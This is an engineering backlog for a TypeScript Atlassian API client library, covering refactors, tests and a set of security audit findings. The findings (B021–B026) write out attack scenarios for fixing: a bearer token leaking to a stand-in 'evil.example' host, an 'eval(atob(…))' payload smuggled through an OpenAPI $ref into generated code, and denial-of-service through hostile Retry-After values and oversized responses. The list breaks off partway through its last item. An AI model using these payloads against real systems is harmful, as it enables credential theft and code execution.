# BACKLOG

> Generated from deep code review — 2026-04-24.
> All items are atomic, testable, and ordered by implementation sequence.
> Status: `[ ]` pending · `[~]` in progress · `[x]` done

---

## Implementation Sequence

The items are grouped into **phases**. Each phase should be completed before the next begins due to dependencies.

| Phase | Name                | Items            | Why This Order                                                  |
| ----- | ------------------- | ---------------- | --------------------------------------------------------------- |
| 0     | Documentation       | B001             | No code changes; unblocks consumers immediately                 |
| 1     | Type correctness    | B002, B003       | Low-risk, high-impact; no behavioral changes                    |
| 2     | Transport refactor  | B004, B005, B006 | High-risk; needs its own focus; unblocks later items            |
| 3     | Type organization   | B007, B008       | Mechanical split; benefits from transport refactor being stable |
| 4     | Reliability         | B009, B010, B011 | Builds on refactor; adds runtime behavior                       |
| 5     | Testing             | B012, B013, B014 | Depends on all code changes being stable                        |
| 6     | Security & advanced | B015, B016, B017 | Lower urgency; requires design discussion                       |
| 7     | Automation          | B018, B019, B020 | CI/CD; can be done incrementally                                |

---

## Phase 0 — Documentation (no code changes)

### [ ] B001: Add JSDoc to all public exports

- **Priority:** P1 — High
- **Description:** Add JSDoc documentation to every exported type, interface, class, and function in `src/index.ts` and `src/core/index.ts`. Each public API needs: description, parameter descriptions for multi-param functions, return type description, and usage example where non-obvious.
- **Acceptance criteria:**
  - [ ] All 80+ exported symbols in `src/index.ts` have JSDoc
  - [ ] `npx tsc` passes with no type errors
  - [ ] `npx typedoc` generates complete documentation without missing symbols
  - [ ] `ClientConfig`, `AuthProvider`, `HttpTransport`, `RetryConfig` have usage examples
- **Files:** `src/index.ts`, `src/core/index.ts`, all referenced type files
- **Dependencies:** None

---

## Phase 1 — Type Correctness (low-risk, high-impact)

### [~] B002: Fix `ApiResponse<T>.error` to preserve structured error data — OBSOLETE

- **Status:** Obsolete as of 2026-05-16. The premise is stale: `ApiResponse<T>` has no `error` field — non-2xx responses throw typed errors (`HttpError` and subclasses) and the full structured Atlassian error body is already preserved on `HttpError.responseBody: unknown` (see `src/core/errors.ts`). `extractErrorMessage` extracts a human-readable message, but the structured payload is never discarded. If future work wants to type `responseBody` more precisely or add an opt-in flag to include it in `HttpError.toJSON()`, file a new ticket.

### [x] B003: Add `retryAfter` property to `RateLimitError`

- **Priority:** P1 — High
- **Description:** `RateLimitError` currently doesn't carry the parsed `retryAfter` value. Add `retryAfter?: number` (seconds) to the class and include it in the constructor. Update `createHttpError` factory to pass it. Consumers can then display "Please retry after X seconds" to users.
- **Acceptance criteria:**
  - [ ] `RateLimitError` has optional `retryAfter: number` property (seconds)
  - [ ] `createHttpError` passes `retryAfter` when status is 429
  - [ ] `RateLimitError` constructor accepts and stores `retryAfter`
  - [ ] Unit test: creating `RateLimitError` with `retryAfter` preserves value
  - [ ] Unit test: creating `RateLimitError` without `retryAfter` is `undefined`
- **Files:** `src/core/errors.ts`, `test/core/errors.test.ts`
- **Dependencies:** None

---

## Phase 2 — Transport Refactor (high-risk, needs own focus)

### [x] B004: Extract retry loop into `src/core/retry-logic.ts`

> Shipped in PR #15 (commit 68fdf2a). Note: implementation extended the existing `src/core/retry.ts` rather than creating a new `retry-logic.ts` file — `executeWithRetry` and `RetryConfig` live there alongside the existing primitives.

- **Priority:** P0 — Critical
- **Description:** The retry loop in `transport.ts` (~90 lines, roughly lines 170-260) handles: attempt counting, exponential backoff calculation, jitter application, network error detection, status code checking, and delay waiting. Extract this into a standalone `executeWithRetry(config, operation)` function. The function should accept the request context and an async operation, returning the result or throwing the final error.
- **Acceptance criteria:**
  - [ ] `executeWithRetry` function exists in `src/core/retry-logic.ts`
  - [ ] Behavior is identical: same retryable status codes (429, 500, 502, 503, 504), same delay calculation, same jitter
  - [ ] `transport.ts` calls `executeWithRetry` instead of inline loop
  - [ ] `transport.ts` reduced by at least 60 lines
  - [ ] All existing retry tests pass
  - [ ] New tests for edge cases: max retries exhausted, all retries network errors, mix of retryable + non-retryable
- **Files:** `src/core/retry-logic.ts` (new), `src/core/transport.ts`, `test/core/retry*.test.ts`
- **Dependencies:** None

### [x] B005: Extract middleware builder into `src/core/middleware.ts`

> Shipped in PR #15 (commit 68fdf2a).

- **Priority:** P0 — Critical
- **Description:** Middleware application in `transport.ts` uses `reduceRight` to compose middlewares. Extract the middleware chain builder into its own module: `createMiddlewareChain(middlewares, handler)`. This makes the chain composable and testable independently.
- **Acceptance criteria:**
  - [ ] `createMiddlewareChain` exists in `src/core/middleware.ts`
  - [ ] Middleware execution order is identical (outermost-first via reduceRight)
  - [ ] `transport.ts` uses `createMiddlewareChain` instead of inline reduceRight
  - [ ] Tests verify middleware order with a tracing middleware
  - [ ] Empty middleware array returns identity handler
- **Files:** `src/core/middleware.ts` (new), `src/core/transport.ts`, `test/core/middleware.test.ts` (new)
- **Dependencies:** B004 (do both in same PR to minimize breakage surface)

### [x] B006: Reduce `transport.ts` to under 200 lines

> Shipped in PR #15 (commit 68fdf2a). Final size: 160 lines (target ≤200). Pure helpers (`buildUrl`, `buildHeaders`, `buildFetchBody`, `sanitizePathForLogging`) moved to new `src/core/request.ts`; response helpers (`parseResponseBody`, `safeParseBody`, `buildApiResponse`) added to `src/core/response.ts`.

- **Priority:** P0 — Critical
- **Description:** After B004 and B005, `transport.ts` should be reduced from 361 to under 200 lines. The remaining file should only contain: `HttpTransport` class definition, request building, response parsing dispatch (json/arrayBuffer/stream), and the `execute` method as a thin orchestrator. Any remaining large functions (e.g., request building, response type dispatch) should be extracted to `src/core/request.ts` and `src/core/response.ts`.
- **Acceptance criteria:**
  - [ ] `transport.ts` is <= 200 lines
  - [ ] `HttpTransport` class still has the same public API (no breaking changes)
  - [ ] All tests pass
  - [ ] `npx tsc` passes with no type errors
  - [ ] Code review confirms each remaining function is <50 lines
- **Files:** `src/core/transport.ts`, `src/core/request.ts` (possibly new), `src/core/response.ts` (possibly new)
- **Dependencies:** B004, B005

---

## Phase 3 — Type Organization (mechanical splits)

### [ ] B007: Split `src/confluence/types.ts` into domain files

- **Priority:** P1 — High
- **Description:** `src/confluence/types.ts` is 433 lines. Split by domain: `page.ts` (Page, CreatePageParams, UpdatePageParams), `space.ts` (Space, CreateSpaceParams), `attachment.ts` (Attachment), `blogPost.ts` (BlogPost), `comment.ts` (FooterComment, InlineComment), `contentProperty.ts` (ContentProperty), `customContent.ts` (CustomContent), `whiteboard.ts` (Whiteboard), `task.ts` (ConfluenceTask), `version.ts` (ContentVersion). Each file exports its types and re-exports from others as needed. Update `src/confluence/index.ts` barrel.
- **Acceptance criteria:**
  - [ ] Each new type file is <= 100 lines
  - [ ] `src/confluence/types.ts` either removed or reduced to <= 20 lines (re-exports only)
  - [ ] All imports of confluence types resolve correctly
  - [ ] `npx tsc` passes with no type errors
  - [ ] All tests pass
  - [ ] No breaking changes to public API (type names and exports unchanged)
- **Files:** `src/confluence/types/page.ts`, `src/confluence/types/space.ts`, `src/confluence/types/attachment.ts`, `src/confluence/types/blogPost.ts`, `src/confluence/types/comment.ts`, `src/confluence/types/contentProperty.ts`, `src/confluence/types/customContent.ts`, `src/confluence/types/whiteboard.ts`, `src/confluence/types/task.ts`, `src/confluence/types/version.ts`, `src/confluence/types/index.ts`, `src/confluence/index.ts`
- **Dependencies:** B006 (stable base)

### [ ] B008: Split `src/jira/types.ts` into domain files

- **Priority:** P1 — High
- **Description:** `src/jira/types.ts` is 228 lines. Split by domain: `issue.ts` (Issue, CreatedIssue, CreateIssueData, UpdateIssueData, Transition, TransitionData), `project.ts` (Project), `user.ts` (User, UserRef), `issueType.ts` (IssueType), `priority.ts` (Priority), `status.ts` (Status, StatusCategory), `search.ts` (SearchResult), `label.ts` (Label), `board.ts`/`sprint.ts` (Boards/Sprints types), `workflow.ts` (Workflow), `dashboard.ts` (Dashboard), `filter.ts` (Filter), `field.ts` (Field), `webhook.ts` (Webhook). Each file exports its types. Update barrel.
- **Acceptance criteria:**
  - [ ] Each new type file is <= 80 lines
  - [ ] `src/jira/types.ts` either removed or reduced to <= 20 lines (re-exports only)
  - [ ] All imports of Jira types resolve correctly
  - [ ] `npx tsc` passes with no type errors
  - [ ] All tests pass
  - [ ] No breaking changes to public API
- **Files:** Multiple under `src/jira/types/` (new directory), `src/jira/types/index.ts`, `src/jira/index.ts`
- **Dependencies:** B007 (do both type splits in same PR)

---

## Phase 4 — Reliability (adds runtime behavior)

### [x] B009: Add LRU eviction to cache middleware

- **Priority:** P1 — High
- **Description:** Current `createCacheMiddleware` uses FIFO eviction for `maxSize` enforcement. Replace with LRU: entries accessed most recently are protected from eviction. Use a `Map` (which preserves insertion order) and move accessed entries to the end on read. Sweep expired entries before checking size.
- **Acceptance criteria:**
  - [ ] Cache uses `Map` with LRU semantics (accessed entries move to end)
  - [ ] `maxSize` enforcement evicts least-recently-used entries first
  - [ ] Expired entry sweep still runs and evicts stale entries before LRU check
  - [ ] TTL behavior is unchanged
  - [ ] Tests verify LRU order: access entry A, add N+1 entries, evict — entry A is still present
  - [ ] All existing cache tests pass
- **Files:** `src/core/cache.ts`, `test/core/cache.test.ts`
- **Dependencies:** None

### [ ] B010: Add circuit breaker pattern

- **Priority:** P2 — Medium
- **Description:** Add a circuit breaker that monitors consecutive 5xx responses. After `threshold` consecutive failures (default 5), the circuit opens and immediately throws `ServiceUnavailableError` without making the request. After `recoveryTimeout` ms (default 30s), transition to half-open: allow one probe request. If it succeeds, close the circuit; if it fails, reopen.
- **Acceptance criteria:**
  - [ ] Circuit breaker tracks consecutive 5xx responses per base URL
  - [ ] Opens after configurable threshold (default 5)
  - [ ] Throws `ServiceUnavailableError` with circuit state when open
  - [ ] Transitions to half-open after configurable timeout (default 30s)
  - [ ] Successful probe in half-open closes the circuit
  - [ ] Failing probe in half-open reopens the circuit
  - [ ] Configurable via `ClientConfig` (e.g., `circuitBreaker: { threshold, recoveryTimeout }`)
  - [ ] Unit tests: all state transitions (closed→open→half-open→closed, closed→open→half-open→open)
  - [ ] Integration test: circuit opens after N consecutive 5xx
- **Files:** `src/core/circuit-breaker.ts` (new), `src/core/config.ts`, `src/core/transport.ts`, `test/core/circuit-breaker.test.ts` (new)
- **Dependencies:** B006 (transport refactor makes this easier to integrate)

### [ ] B011: Add request ID propagation

- **Priority:** P2 — Medium
- **Description:** Generate a UUID for each request, send it as `X-Request-Id` header, and extract the response's `X-Request-Id` header. Include the request ID in error logs and in error objects so users can correlate logs with Atlassian's side.
- **Acceptance criteria:**
  - [ ] Each request gets a unique UUID v4 via `crypto.randomUUID()`
  - [ ] Request ID sent as `X-Request-Id` header
  - [ ] Response `X-Request-Id` is captured and attached to `ApiResponse.meta.requestId`
  - [ ] Error objects include `requestId` property
  - [ ] Error logger includes request ID in log context
  - [ ] Tests verify request ID is unique per request
  - [ ] Tests verify request ID appears in error context
- **Files:** `src/core/types.ts`, `src/core/transport.ts`, `src/core/errors.ts`, `test/core/transport.test.ts`
- **Dependencies:** B006 (transport refactor)

---

## Phase 5 — Testing (depends on all code changes being stable)

### [ ] B012: Add mock-server transport tests

- **Priority:** P1 — High
- **Description:** Create a minimal HTTP mock server (using `node:http` or `undici.MockAgent`) that simulates Atlassian API behavior: rate limit headers, retry-after, 5xx failures, structured error responses, pagination links. Write mock-server tests that verify: header formatting, URL encoding, retry behavior against real HTTP responses, pagination state machine, streaming response handling.
- **Acceptance criteria:**
  - [ ] Mock server simulates rate limiting with `retry-after` header
  - [ ] Mock-server test: client retries correctly on 429 with retry-after
  - [ ] Mock-server test: client retries correctly on 5xx
  - [ ] Mock-server test: structured error response is parsed correctly
  - [ ] Mock-server test: cursor pagination advances correctly
  - [ ] Mock-server test: offset pagination works for Jira search
  - [ ] Mock-server test: streaming response returns correct data
  - [ ] Mock-server test: URL encoding handles special characters in space/key/page titles
- **Files:** `test/mock-server/` (new directory), `test/mock-server/server.ts`, `test/mock-server/transport.test.ts`, `test/mock-server/pagination.test.ts`
- **Dependencies:** B006 (stable transport)

### [ ] B013: Add CLI E2E tests

- **Priority:** P1 — High
- **Description:** Test the `atlas` CLI binary with argument parsing, command routing, and output formatting. Use a mock server for API calls. Test: help output, subcommand routing, error messages for invalid commands, output formatting for different resource types.
- **Acceptance criteria:**
  - [ ] `atlas --help` output is tested
  - [ ] `atlas jira issues get --help` shows correct flags
  - [ ] Invalid subcommand shows appropriate error
  - [ ] `atlas jira issues get AC-1` with mock server returns formatted output
  - [ ] `atlas confluence pages list --space-key TEST` with mock server returns formatted output
  - [ ] Auth error displays user-friendly message
  - [ ] Tests run in CI
- **Files:** `test/e2e/cli.test.ts` (new), `test/e2e/helpers/` (new)
- **Dependencies:** None

### [ ] B014: Add property-based tests for critical functions

- **Priority:** P2 — Medium
- **Description:** Add property-based tests (using `fast-check` or `jest-fast-check`) for: URL encoding (round-trip test: encode → decode → original), JWT signing (key round-trip: sign → verify → payload matches), pagination state machine (any sequence of API responses produces valid state), exponential backoff (delays are monotonically increasing within bounds).
- **Acceptance criteria:**
  - [ ] URL encoding: 100 random strings encode and decode to original
  - [ ] JWT signing: sign with key K, verify with key K → payload matches
  - [ ] JWT signing: sign with key K, verify with key K' → verification fails
  - [ ] Pagination: any sequence of valid API responses produces valid cursor/offset state
  - [ ] Backoff: delays are monotonically increasing and within [baseDelay, maxDelay]
  - [ ] Each property test runs 100+ iterations
  - [ ] Tests run in CI
- **Files:** `test/property/` (new directory), `test/property/url-encoding.test.ts`, `test/property/jwt.test.ts`, `test/property/pagination.test.ts`, `test/property/backoff.test.ts`
- **Dependencies:** B006 (stable retry logic)

---

## Phase 6 — Security & Advanced

### [ ] B015: Add RS256 support for Connect JWT

- **Priority:** P2 — Medium
- **Description:** Atlassian Connect production apps require RS256 JWT signing. Add `createConnectJwtMiddlewareRS256(config: { privateKey: string; publicKey: string })` and `signConnectJwtRS256` function. HS256 remains for development. Document when to use each.
- **Acceptance criteria:**
  - [ ] `signConnectJwtRS256` produces valid RS256 JWTs
  - [ ] `createConnectJwtMiddlewareRS256` creates middleware identically to HS256 version
  - [ ] Both middlewares produce compatible JWTs (Atlassian can verify with public key)
  - [ ] JSDoc explains when to use HS256 vs RS256
  - [ ] Exported from `src/core/index.ts`
  - [ ] Unit test: RS256 JWT can be decoded and verified with public key
  - [ ] Unit test: HS256 and RS256 middlewares produce different alg headers
- **Files:** `src/core/connect-jwt.ts` (add RS256 functions), `src/core/index.ts`
- **Dependencies:** None

### [ ] B016: Add OAuth concurrent refresh retry queue

- **Priority:** P2 — Medium
- **Description:** Current OAuth refresh uses a single `refreshPromise` for deduplication. If two refreshes fail simultaneously, both callers retry, creating a thundering herd. Replace with a bounded retry queue: track `inFlightRefreshes: Set<Promise>` with a max of 1 concurrent refresh. Additional callers wait for the single in-flight refresh; if it fails, they all retry but with a staggered delay (jitter) to prevent another herd.
- **Acceptance criteria:**
  - [ ] Only one refresh request is in-flight at a time per OAuth config
  - [ ] Additional callers wait for the in-flight refresh
  - [ ] If refresh fails, retry queue retries with staggered delays
  - [ ] Max retry attempts configurable (default 3)
  - [ ] After max retries, throw `AuthenticationError` with refresh failure details
  - [ ] Tests: concurrent callers all get same refreshed tokens
  - [ ] Tests: refresh failure propagates to all waiters
  - [ ] Tests: staggered retry delays prevent thundering herd
- **Files:** `src/core/oauth.ts`, `test/core/oauth.test.ts`
- **Dependencies:** None

### [ ] B017: Add rate limit awareness (token bucket)

- **Priority:** P3 — Low
- **Description:** Add proactive token-bucket rate limiting instead of reactive (wait-after-hit). Track `x-ratelimit-remaining` and `x-ratelimit-reset` headers, maintain a local token bucket, and pause before making requests when the bucket is empty. This reduces latency spikes from repeated 429s.
- **Acceptance criteria:**
  - [ ] Token bucket initialized from `x-ratelimit-remaining` header
  - [ ] Tokens replenished based on `x-ratelimit-reset` and known rate
  - [ ] Requests wait when bucket is empty (before making the request)
  - [ ] Bucket resets on successful response
  - [ ] Falls back to reactive (current behavior) when rate limit headers are absent
  - [ ] Configurable via `ClientConfig` (e.g., `rateLimit: { proactive: true }`)
  - [ ] Tests: bucket drains correctly, replenishes correctly, proactive wait occurs
- **Files:** `src/core/rate-limiter.ts` (extend), `src/core/config.ts`, `src/core/transport.ts`, `test/core/rate-limiter.test.ts`
- **Dependencies:** B010 (circuit breaker — both deal with rate limiting but circuit breaker is higher priority)

---

## Phase 7 — Automation (CI/CD)

### [ ] B018: Add OpenAPI type regeneration to CI

- **Priority:** P2 — Medium
- **Description:** Add a script `scripts/regenerate-types.ts` that fetches Atlassian's OpenAPI specs and regenerates TypeScript types via `generateTypes()`. Add a CI check that runs the script and fails if the generated types differ from checked-in types. This prevents type rot in hand-written types.
- **Acceptance criteria:**
  - [ ] `scripts/regenerate-types.ts` fetches specs and regenerates types
  - [ ] Script is idempotent (running twice produces identical output)
  - [ ] CI step runs regeneration and diffs against committed types
  - [ ] CI fails on diff with instructions to run `npm run regenerate-types`
  - [ ] Generated types compile without errors
  - [ ] README documents how to update types
- **Files:** `scripts/regenerate-types.ts` (new), `.github/workflows/` (CI config), `package.json` (script)
- **Dependencies:** None

### [ ] B019: Add `validateScopes` CLI command

- **Priority:** P3 — Low
- **Description:** Add `atlas scopes validate --operations jira:issues:get,confluence:pages:list` command that checks required scopes against known operations in `OPERATION_SCOPES`. Reports missing scopes and suggests which operations will fail. Useful for pre-flight checks before running CLI commands.
- **Acceptance criteria:**
  - [ ] `atlas scopes validate --operations op1,op2` runs successfully
  - [ ] Reports required scopes for each operation
  - [ ] Reports when required scopes are unknown (not in `OPERATION_SCOPES`)
  - [ ] Exit code 0 if all scopes known, 1 if any unknown
  - [ ] `--help` shows usage
  - [ ] Unit tests for `detectRequiredScopes` with various operation sets
- **Files:** `src/cli/commands/scopes.ts` (new), `src/cli/router.ts`, `src/core/scopes.ts`
- **Dependencies:** None

### [x] B020: Add pagination cursor validation

- **Priority:** P3 — Low
- **Description:** Detect infinite loops in cursor-based pagination: if the cursor value doesn't change between consecutive API responses, stop and throw `PaginationError('cursor not advancing')`. Also add a `maxPages` option (default 10000) to prevent runaway pagination. Log a warning when approaching the limit.
- **Acceptance criteria:**
  - [ ] `paginateCursor` throws `PaginationError` when cursor doesn't advance
  - [ ] `maxPages` option stops pagination after N pages
  - [ ] Warning logged at 80% of maxPages
  - [ ] Default maxPages is 10000
  - [ ] Tests: cursor not advancing → error thrown
  - [ ] Tests: maxPages reached → iteration stops cleanly
  - [ ] Tests: cursor advances normally → no interference
- **Files:** `src/core/pagination.ts`, `test/core/pagination.test.ts`
- **Dependencies:** None

---

## Phase 8 — CTF / Security findings (2026-05-16)

> Discovered during a code-review CTF pass. Each item is a real exploitable
> weakness with a concrete attack scenario and a proposed fix. Triage before
> the next release.

### [x] B021: Bearer-token exfiltration via absolute URL in `RequestOptions.path` (SSRF + credential leak)

> Shipped in branch `fix/ctf-phase8-p0p1` (2026-05-16). `buildUrl` now takes an `allowedHosts` parameter and refuses absolute URLs whose host is not on the list; the transport always passes `config.allowedHosts`. Resolved alongside [[B034]] (default Atlassian suffix allowlist + `ClientConfig.allowedHosts` escape hatch).

- **Priority:** P0 — Critical
- **Severity:** High — credential disclosure
- **Description:** `buildUrl` (`src/core/request.ts:14-33`) honours the documented behaviour that a `path` starting with `http://` or `https://` bypasses `baseUrl` resolution entirely. `HttpTransport.executeFetch` (`src/core/transport.ts:94-159`) then attaches `this.authProvider.getHeaders()` — i.e. the `Authorization: Basic …` or `Authorization: Bearer …` header for the configured Atlassian credentials — to whatever host that absolute URL points to. A downstream consumer that forwards an attacker-controlled value into `RequestOptions.path` (untrusted issue links, webhook payloads, link-follow workflows, etc.) leaks the API token to the attacker's server. No HTTP redirect is needed; the first request itself goes to the attacker.
- **Attack scenario:**
  1. Service ingests untrusted data containing a "next page" link or self-link.
  2. Code calls `transport.request({ method: 'GET', path: untrustedLink, ... })`.
  3. `buildUrl` constructs `new URL(untrustedLink)` → `https://evil.example/`.
  4. Transport sends `Authorization: Basic <base64(email:apiToken)>` to `evil.example`.
  5. Attacker harvests the credential and now has full Atlassian API access for that account.
- **Acceptance criteria:**
  - [ ] `buildUrl` rejects absolute URLs whose origin does not match `baseUrl`'s origin (throw `ValidationError`), OR the transport refuses to attach auth headers when the resolved URL's origin differs from `config.baseUrl`.
  - [ ] Opt-in escape hatch (`config.allowCrossOriginPaths?: readonly string[]`) for the genuine cross-API call use-case the current behaviour was added for.
  - [ ] Unit test: `buildUrl('https://x.atlassian.net', 'https://evil.example/steal')` throws.
  - [ ] Unit test: end-to-end — request with foreign-origin `path` does not see the `Authorization` header reach the foreign host.
  - [ ] Security note added to `RequestOptions.path` JSDoc.
- **Files:** `src/core/request.ts`, `src/core/transport.ts`, `src/core/config.ts`, `test/core/request.test.ts`, `test/core/transport.test.ts`
- **Dependencies:** None

### [x] B022: Cross-tenant cache leakage — `buildCacheKey` omits the auth identity

> Shipped in branch `fix/ctf-phase8-p0p1` (2026-05-16). `buildCacheKey` now prefixes the cache key with `auth:<sha256(Authorization)>` (or `no-auth` when absent) so two callers with different bearer tokens never share an entry.

- **Priority:** P0 — Critical
- **Severity:** High — confidentiality breach across tenants/users
- **Description:** `buildCacheKey` (`src/core/cache.ts:104-114`) keys cached responses on `method + path + sortedQuery` only. When a single `HttpTransport` is shared across tenants — e.g. a server-side process that uses the OAuth-refresh middleware (`src/core/oauth.ts`) to rotate per-tenant tokens, or a multi-user CLI host — Tenant A's cached `GET /rest/api/3/myself` is served to Tenant B on a cache hit because both produce the same key. The cache holds `ApiResponse` bodies in memory; the hit returns Tenant A's payload to Tenant B's caller verbatim.
- **Attack scenario:**
  1. Process boots one `HttpTransport` with `createCacheMiddleware()` + `createOAuthRefreshMiddleware()`.
  2. User A's request for `GET /rest/api/3/myself` populates the cache.
  3. Within `ttl`, User B (different bearer token) issues the same call.
  4. Cache hit → User B receives User A's identity payload.
- **Acceptance criteria:**
  - [ ] `buildCacheKey` accepts and incorporates a cache-scope identifier sourced from the request (e.g. a stable hash of the resolved `Authorization` header, or an explicit `RequestOptions.cacheScope?: string`).
  - [ ] Default behaviour scopes the key so that two requests with different `Authorization` headers never share a cache entry.
  - [ ] Unit test: two requests with the same path/query but different `Authorization` headers produce different keys.
  - [ ] Unit test: cached entry under token A is NOT returned to token B.
  - [ ] Docs warn against sharing a cached transport across trust boundaries.
- **Files:** `src/core/cache.ts`, `src/core/types.ts`, `test/core/cache.test.ts`
- **Dependencies:** None

### [x] B023: Unbounded server-controlled `Retry-After` enables remote DoS of the client

> Shipped in branch `fix/ctf-phase8-p0p1` (2026-05-16). `getRetryDelay` now clamps `error.retryAfter * 1000` against `maxRetryDelay`; the full server value remains accessible on `RateLimitError.retryAfter` for callers that want to honour a longer wait explicitly.

- **Priority:** P1 — High
- **Severity:** Medium — availability (caller process stalls indefinitely)
- **Description:** `getRetryAfterMs` (`src/core/rate-limiter.ts:4-12`) accepts any non-negative numeric `Retry-After` value with no upper bound and multiplies by 1000. `getRetryDelay` (`src/core/retry.ts:147-165`) deliberately preserves the server-advertised floor (`base = error.retryAfter * 1000`) and only caps the added jitter against `maxRetryDelay`. A hostile or compromised Atlassian-side endpoint (or any MITM that injects a 429) returning `Retry-After: 9999999999` parks the client in `sleepWithAbort` for ~317 years. The per-request `timeout` does not bound the between-attempts sleep, and any caller that does not pass an `AbortSignal` has no way to recover short of process restart.
- **Attack scenario:**
  1. Reverse-proxy / man-in-the-middle / hostile self-hosted instance returns `HTTP 429 Retry-After: 2147483647`.
  2. `createHttpError` wraps it as `RateLimitError` with `retryAfter = 2147483647` seconds.
  3. Retry loop computes `base = 2_147_483_647_000` ms and schedules `setTimeout` for that duration.
  4. Worker thread stalls; subsequent calls queue behind it (CLI), or one connection of the pool is wasted (server library), until the process is killed.
- **Acceptance criteria:**
  - [ ] `getRetryAfterMs` caps the parsed value at a sensible ceiling (e.g. `maxRetryDelay` from config, or a hard 600s) and discards anything beyond it.
  - [ ] `getRetryDelay` always returns a value `<= maxRetryDelay` even on `RateLimitError` (the "preserve server-advertised floor" comment is updated to "preserve floor, cap to `maxRetryDelay`").
  - [ ] `RateLimitError` exposes the raw server value so callers that want longer waits can opt in explicitly.
  - [ ] Also accept HTTP-date form per RFC 9110 §10.2.3, or document the limitation.
  - [ ] Unit test: `Retry-After: 9999999999` → effective delay clamped.
  - [ ] Unit test: well-behaved `Retry-After: 30` still produces a 30s+jitter delay.
- **Files:** `src/core/rate-limiter.ts`, `src/core/retry.ts`, `src/core/errors.ts`, `test/core/rate-limiter.test.ts`, `test/core/retry.test.ts`
- **Dependencies:** None

### [x] B024: `createBatchMiddleware` deduplication drops the `Authorization` header → cross-identity response coalescing

> Shipped in branch `fix/ctf-phase8-p0p1` (2026-05-16). `buildRequestKey` now prefixes the dedupe key with the auth-identity hash. Concurrent identical requests with different tokens are no longer coalesced; same-token requests still dedupe.

- **Priority:** P0 — Critical
- **Severity:** High — confidentiality breach across concurrent identities
- **Description:** `serializeHeaders` in `createBatchMiddleware` (`src/core/batch.ts:55-63`) deliberately filters out `Authorization` from the dedupe key. The comment claims this is safe because "Authorization is injected by the transport, not by callers" — but `createOAuthRefreshMiddleware` (`src/core/oauth.ts:69-103`) and `createConnectJwtMiddleware` (`src/core/connect-jwt.ts:27-38`) both inject per-caller `Authorization` headers BEFORE the batch middleware runs, depending on chain order. With those middlewares ordered outside batch (which is the typical "outer → cache → batch → inner" composition shown in the existing tests), two concurrent callers with different bearer tokens issuing the same `GET path?query` are coalesced into one in-flight request, and BOTH receive the response that was authenticated with whichever caller's token won the race.
- **Attack scenario:**
  1. Server-side process composes middleware: `[oauthA, oauthB, createBatchMiddleware()]` — or any chain where token-bearing middlewares sit outside batch.
  2. Two concurrent requests for `GET /rest/api/3/myself` arrive — one from User A, one from User B.
  3. Batch key is identical (Authorization stripped). Second call is coalesced onto the first promise.
  4. Both callers receive the body that was fetched with User A's token.
- **Acceptance criteria:**
  - [ ] `buildRequestKey` includes the `Authorization` header (or a stable hash thereof) in the dedupe key.
  - [ ] Update the JSDoc to reflect that auth identity DOES partition the dedupe space.
  - [ ] Unit test: concurrent identical requests with different bearer tokens are NOT coalesced.
  - [ ] Unit test: concurrent identical requests with identical bearer tokens ARE coalesced (existing behaviour preserved for legitimate use).
  - [ ] Cross-reference with B022 — both stem from the same "key ignores auth" anti-pattern.
- **Files:** `src/core/batch.ts`, `test/core/batch.test.ts`
- **Dependencies:** None (but fix alongside B022 for consistency)

### [ ] B025: TypeScript code injection via untrusted OpenAPI `$ref` in `generateTypes`

- **Priority:** P1 — High
- **Severity:** High — arbitrary code execution if the generated file is compiled and imported
- **Description:** `generateTypes` (`src/core/openapi.ts:85-105`) validates top-level schema names with `isValidIdentifier`, but `resolveRef` (`src/core/openapi.ts:268-272`) does NOT validate the resolved name extracted from a `$ref`. The string after the last `/` is emitted verbatim into the generated TypeScript source via `schemaToTsType`. A hostile or attacker-controlled OpenAPI spec can place a payload in `$ref`, e.g. `#/components/schemas/string; eval(atob('…')); //`. The slash split yields `string; eval(atob('…')); //`, which lands inside emitted constructs such as `export type Foo = string; eval(atob('…')); //;` — a statement-level `eval` that executes whenever the generated module is loaded.
- **Attack scenario:**
  1. Library consumer fetches an OpenAPI spec from a third-party (or accepts user-uploaded specs in an internal tool).
  2. Calls `generateTypes(spec)` and writes the result to `generated.ts`.
  3. `tsc` compiles it; downstream code imports `generated.js`.
  4. Module load → payload executes with the host process's privileges.
- **Acceptance criteria:**
  - [ ] `resolveRef` validates the resolved name with `isValidIdentifier` and throws `Error('Invalid $ref target name: …')` otherwise.
  - [ ] Every `$ref` value is also checked to start with `#/components/schemas/` (or a documented prefix) to avoid out-of-spec references.
  - [ ] Property names emitted via `JSON.stringify(propName)` are also rejected when they contain non-ASCII characters that could break out via Unicode line terminators (` `, ` `).
  - [ ] Enum string values in `escapeStringLiteral` additionally escape `\n`, `\r`, ` `, ` ` so they cannot break out of the single-quoted literal.
  - [ ] Unit test: spec with `$ref: '#/components/schemas/Foo; eval(1)//'` throws before emitting source.
  - [ ] Unit test: spec with enum value `"a\nb"` produces a syntactically valid TS string literal.
  - [ ] Fuzz test: 100 random refs / enum values either round-trip or throw, never emit broken source.
- **Files:** `src/core/openapi.ts`, `test/core/openapi.test.ts`
- **Dependencies:** None

### [ ] B026: Unbounded response body parsing enables memory-exhaustion DoS

- **Priority:** P2 — Medium
- **Severity:** Medium — availability (per-process memory exhaustion)
- **Description:** `parseResponseBody` and `safeParseBody` (`src/core/response.ts:43-75`) call `response.json()` / `response.arrayBuffer()` with no size cap. The per-request `timeout` does not bound body parsing once the headers have been received — `fetch` returns the `Response` once headers are in, and body consumption proceeds until the server's `Content-Length` is reached or the connection is closed. A hostile Atlassian-shaped endpoint (rogue self-hosted instance, MITM under a compromised CA, or a misbehaving real endpoint) can stream a multi-gigabyte JSON body and OOM the calling process. Combined with B023 (unbounded `Retry-After`), the client has no safe upper bound on either time or memory consumed per request.
- **Attack scenario:**
  1. Compromised or hostile endpoint returns `HTTP 200` with `Content-Type: application/json` and a 4GB body of repeated `{"a":"…"}` chunks.
  2. `executeFetch` calls `parseResponseBody` → `response.json()`.
  3. The runtime buffers the entire body into memory before `JSON.parse` runs.
  4. Process OOMs and dies (or starts swapping, taking the host with it).
- **Acceptance criteria:**
  - [ ] `ClientConfig` adds `maxResponseBytes?: number` (default e.g. 50 MiB) and `resolveConfig` validates it.
  - [ ] `parseResponseBody` and `safeParseBody` enforce the cap: read the body via `response.body` reader and abort once cumulative bytes exceed the cap, throwing a new `ResponseTooLargeError extends AtlassianError`.
  - [ ] Streaming responses (`responseType: 'stream'`) bypass the cap (caller takes responsibility — already documented).
  - [ ] Server's `Content-Length` header, when present and exceeding the cap, short-circuits before any read.
  - [ ] Unit test: 100 MiB synthetic response → `ResponseTooLargeError` thrown, no memory blowup.
